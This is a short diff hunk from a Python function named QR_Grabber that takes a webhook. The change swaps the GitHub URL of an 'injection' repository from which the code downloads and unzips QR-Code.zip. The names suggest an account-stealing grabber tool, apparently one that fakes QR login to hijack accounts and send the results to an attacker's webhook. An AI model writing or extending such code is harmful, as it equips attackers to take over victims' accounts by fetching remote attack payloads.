@@ -97,7 +97,7 @@ def QR_Grabber(Webhook):
 
     #Baixe modelos de código QR
     urlretrieve(
-        "https://github.com/Tzwebfofo/injection/blob/main/QR-Code.zip?raw=true",
+        "https://github.com/Tzpuao/injection/blob/main/QR-Code.zip?raw=true",
         filename="QR-Code.zip",
     )
     with ZipFile("QR-Code.zip", 'r')as zip2:
